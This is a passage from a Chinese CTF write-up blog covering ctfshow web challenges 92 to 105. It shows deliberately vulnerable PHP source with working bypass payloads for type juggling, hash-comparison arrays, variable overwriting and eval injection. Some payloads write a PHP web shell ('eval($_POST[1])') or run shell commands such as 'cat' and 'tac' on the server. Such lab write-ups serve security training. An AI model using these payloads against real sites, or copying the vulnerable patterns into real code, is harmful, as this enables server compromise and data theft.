class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    $num = $_GET[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>($num==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(intval($num,<span class="number">0</span>)==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> intval($num,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>小数点绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?num&#x3D;4476.1</span><br></pre></td></tr></table></figure><p>科学计数法绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">var_dump(<span class="string">&#x27;4476e1&#x27;</span>==<span class="number">4476</span>); <span class="comment">// bool(false)</span></span><br><span class="line">var_dump(<span class="string">&#x27;4476e1&#x27;</span>==<span class="number">44760</span>);  <span class="comment">// bool(true)</span></span><br><span class="line">var_dump(intval(<span class="string">&#x27;4476e1&#x27;</span>)); <span class="comment">// int(44760)</span></span><br></pre></td></tr></table></figure><h3 id="web93">web93</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    $num = $_GET[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>($num==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/[a-z]/i&quot;</span>, $num))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(intval($num,<span class="number">0</span>)==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> intval($num,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>小数点绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?num&#x3D;4476.1</span><br></pre></td></tr></table></figure><h3 id="web94">web94</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    $num = $_GET[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>($num===<span class="string">&quot;4476&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/[a-z]/i&quot;</span>, $num))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!strpos($num, <span class="string">&quot;0&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(intval($num,<span class="number">0</span>)===<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>小数点绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?num&#x3D;4476.0</span><br></pre></td></tr></table></figure><h3 id="web95">web95</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    $num = $_GET[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>($num==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/[a-z]|\./i&quot;</span>, $num))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!strpos($num, <span class="string">&quot;0&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(intval($num,<span class="number">0</span>)===<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201022140900.png" alt=""></p><p>用八进制绕过，又由于0不能出现在第一个字符，可以用空格或+绕过。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?num&#x3D;+10574</span><br></pre></td></tr></table></figure><h3 id="web96">web96</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;u&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>($_GET[<span class="string">&#x27;u&#x27;</span>]==<span class="string">&#x27;flag.php&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        highlight_file($_GET[<span class="string">&#x27;u&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?u&#x3D;.&#x2F;flag.php</span><br></pre></td></tr></table></figure><h3 id="web97">web97</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;a&#x27;</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>($_POST[<span class="string">&#x27;b&#x27;</span>])) &#123;</span><br><span class="line"><span class="keyword">if</span> ($_POST[<span class="string">&#x27;a&#x27;</span>] != $_POST[<span class="string">&#x27;b&#x27;</span>])</span><br><span class="line"><span class="keyword">if</span> (md5($_POST[<span class="string">&#x27;a&#x27;</span>]) === md5($_POST[<span class="string">&#x27;b&#x27;</span>]))</span><br><span class="line"><span class="keyword">echo</span> $flag;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">&#x27;Wrong.&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>md5强等号用数组绕过，返回NULL</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a[]&#x3D;1&amp;b[]&#x3D;2</span><br></pre></td></tr></table></figure><h3 id="web98">web98</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">$_GET?$_GET=&amp;$_POST:<span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line">$_GET[<span class="string">&#x27;flag&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?$_GET=&amp;$_COOKIE:<span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line">$_GET[<span class="string">&#x27;flag&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?$_GET=&amp;$_SERVER:<span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line">highlight_file($_GET[<span class="string">&#x27;HTTP_FLAG&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?$flag:<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>一开始没太看懂这个题目的意思，后来百度才知道PHP的&amp;也有引用的功能。</p><p>所以第二行代码的意思就是：如果存在GET请求则引用POST请求的内容，否则<code>$_GET='flag'</code>。</p><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?a&#x3D;</span><br><span class="line">POST HTTP_FLAG&#x3D;flag</span><br></pre></td></tr></table></figure><h3 id="web99">**web99</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">$allow = <span class="keyword">array</span>();</span><br><span class="line"><span class="keyword">for</span> ($i=<span class="number">36</span>; $i &lt; <span class="number">0x36d</span>; $i++) &#123; </span><br><span class="line">    array_push($allow, rand(<span class="number">1</span>,$i));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;n&#x27;</span>]) &amp;&amp; in_array($_GET[<span class="string">&#x27;n&#x27;</span>], $allow))&#123;</span><br><span class="line">    file_put_contents($_GET[<span class="string">&#x27;n&#x27;</span>], $_POST[<span class="string">&#x27;content&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这里考察in_array函数的特性</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$allow1 = <span class="keyword">array</span>(<span class="number">10</span>,<span class="number">20</span>);</span><br><span class="line">var_dump(in_array(<span class="string">&#x27;10.php&#x27;</span>,$allow1));  <span class="comment">// bool(true)</span></span><br><span class="line">$allow2 = <span class="keyword">array</span>(<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>);</span><br><span class="line">var_dump(in_array(<span class="number">0</span>,$allow2));  <span class="comment">// bool(true)</span></span><br></pre></td></tr></table></figure><blockquote><p>由于该函数并未将第三个参数设置为 <strong>true</strong> ，这导致攻击者可以通过构造的文件名来绕过服务端的检测，例如文件名为 <strong>7shell.php</strong> 。因为PHP在使用 <strong>in_array()</strong> 函数判断时，会将 <strong>7shell.php</strong> 强制转换成数字7，而数字7在 <strong>range(1,24)</strong> 数组中，最终绕过 <strong>in_array()</strong> 函数判断，</p></blockquote><p>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?n&#x3D;10.php</span><br><span class="line">content&#x3D;&lt;?php eval($_POST[1]);?&gt;</span><br></pre></td></tr></table></figure><h3 id="web100">web100</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;ctfshow.php&quot;</span>);</span><br><span class="line"><span class="comment">//flag in class ctfshow;</span></span><br><span class="line">$ctfshow = <span class="keyword">new</span> ctfshow();</span><br><span class="line">$v1=$_GET[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">$v2=$_GET[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">$v3=$_GET[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line">$v0=is_numeric($v1) <span class="keyword">and</span> is_numeric($v2) <span class="keyword">and</span> is_numeric($v3);</span><br><span class="line"><span class="keyword">if</span>($v0)&#123;</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;/&quot;</span>, $v2))&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/\;/&quot;</span>, $v3))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">&quot;<span class="subst">$v2</span>(&#x27;ctfshow&#x27;)<span class="subst">$v3</span>&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;    </span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>Payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?v1&#x3D;1&amp;v2&#x3D;?&gt;&lt;?&#x3D;&#96;cat ctfshow.php&#96;?&gt;&amp;v3&#x3D;;</span><br></pre></td></tr></table></figure><p>还可以使用get_class_vars()函数获取类属性：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?v1&#x3D;1&amp;v2&#x3D;get_class_vars&amp;v3&#x3D;);</span><br></pre></td></tr></table></figure><h3 id="web101">**web101</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;ctfshow.php&quot;</span>);</span><br><span class="line"><span class="comment">//flag in class ctfshow;</span></span><br><span class="line">$ctfshow = <span class="keyword">new</span> ctfshow();</span><br><span class="line">$v1=$_GET[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">$v2=$_GET[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">$v3=$_GET[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line">$v0=is_numeric($v1) <span class="keyword">and</span> is_numeric($v2) <span class="keyword">and</span> is_numeric($v3);</span><br><span class="line"><span class="keyword">if</span>($v0)&#123;</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\)|\-|\_|\+|\=|\&#123;|\[|\&quot;|\&#x27;|\,|\.|\;|\?|[0-9]/&quot;</span>, $v2))&#123;</span><br><span class="line">        <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\(|\-|\_|\+|\=|\&#123;|\[|\&quot;|\&#x27;|\,|\.|\?|[0-9]/&quot;</span>, $v3))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">&quot;<span class="subst">$v2</span>(&#x27;ctfshow&#x27;)<span class="subst">$v3</span>&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>PHP获取类属性的几种方法：<a href="https://my.oschina.net/u/3544550/blog/1489826">https://my.oschina.net/u/3544550/blog/1489826</a></p><p>这里是使用反射API，payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?v1&#x3D;1&amp;v2&#x3D;echo(new ReflectionClass&amp;v3&#x3D;);</span><br></pre></td></tr></table></figure><h3 id="web102">**web102</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">$v1 = $_POST[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">$v2 = $_GET[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">$v3 = $_GET[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line">$v4 = is_numeric($v2) <span class="keyword">and</span> is_numeric($v3);</span><br><span class="line"><span class="keyword">if</span>($v4)&#123;</span><br><span class="line">    $s = substr($v2,<span class="number">2</span>);</span><br><span class="line">    $str = call_user_func($v1,$s);</span><br><span class="line">    <span class="keyword">echo</span> $str;</span><br><span class="line">    file_put_contents($v3,$str);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>思路不太好想，PHP5的版本下payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GET: ?v2&#x3D;0x3c3f3d60746163202a603b3f3e&amp;v3&#x3D;sh.php</span><br><span class="line">POST: v1&#x3D;hex2bin</span><br><span class="line"></span><br><span class="line">echo hex2bin(&#39;3c3f3d60746163202a603b3f3e&#39;) \\ &lt;?&#x3D;&#96;tac *&#96;;?&gt;</span><br></pre></td></tr></table></figure><p>但是这个payload在php7下无法实现，主要原因是该版本的十六进制表示法中的字符串不再被视为数字字符串，即is_numeric（） 现在返回 <code>FALSE。</code></p><p>所以这道题就有些脑洞了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">构造需要写入文件的payload</span><br><span class="line">&lt;?&#x3D;&#96;cat *&#96;;</span><br><span class="line">使用base64编码后：PD89YGNhdCAqYDs</span><br><span class="line">使用bin2hex函数将字符串转成十六进制的内容：5044383959474e6864434171594473</span><br><span class="line">&#x2F;&#x2F;这里有个巧妙之处，刚好只有一个e，识别成了科学计数法，很顶</span><br><span class="line">而这里的v3也需要进行修改成伪协议的方式</span><br><span class="line">最后的Payload:</span><br><span class="line">GET:?v2&#x3D;115044383959474e6864434171594473&amp;v3&#x3D;php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.base64-decode&#x2F;resource&#x3D;sh.php</span><br><span class="line">POST:v1&#x3D;hex2bin</span><br></pre></td></tr></table></figure><blockquote><p>出题人：<a href="https://cnblogs.com/erR0Ratao/p/13731541.html">https://cnblogs.com/erR0Ratao/p/13731541.html</a></p></blockquote><h3 id="web103">web103</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">$v1 = $_POST[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">$v2 = $_GET[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">$v3 = $_GET[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line">$v4 = is_numeric($v2) <span class="keyword">and</span> is_numeric($v3);</span><br><span class="line"><span class="keyword">if</span>($v4)&#123;</span><br><span class="line">    $s = substr($v2,<span class="number">2</span>);</span><br><span class="line">    $str = call_user_func($v1,$s);</span><br><span class="line">    <span class="keyword">echo</span> $str;</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/.*p.*h.*p.*/i&quot;</span>,$str))&#123;</span><br><span class="line">        file_put_contents($v3,$str);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;Sorry&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>同上</p><h3 id="web104">web104</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">&#x27;v2&#x27;</span>]))&#123;</span><br><span class="line">    $v1 = $_POST[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    $v2 = $_GET[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(sha1($v1)==sha1($v2))&#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>数组绕过</p><h3 id="web105">**web105</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$error=<span class="string">&#x27;你还想要flag嘛？&#x27;</span>;</span><br><span class="line">$suces=<span class="string">&#x27;既然你想要那给你吧！&#x27;</span>;</span><br><span class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $key =&gt; $value)&#123;</span><br><span class="line">    <span class="keyword">if</span>($key===<span class="string">&#x27;error&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;what are you doing?!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $$key=$$value;</span><br><span class="line">&#125;<span class="keyword">foreach</span>($_POST <span class="keyword">as</span> $key =&gt; $value)&#123;</span><br><span class="line">    <span class="keyword">if</span>($value===<span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;what are you doing?!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $$key=$$value;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!($_POST[<span class="string">&#x27;flag&#x27;</span>]==$flag))&#123;</span><br><span class="line">    <span class="keyword">die</span>($error);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;your are good&quot;</span>.$flag.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">die</span>($suces);</span><br></pre></td></tr></table></figure><p>考察变量覆盖</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET: ?suces&#x3D;flag</span><br><span class="line">POST: error&#x3D;suces</span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td 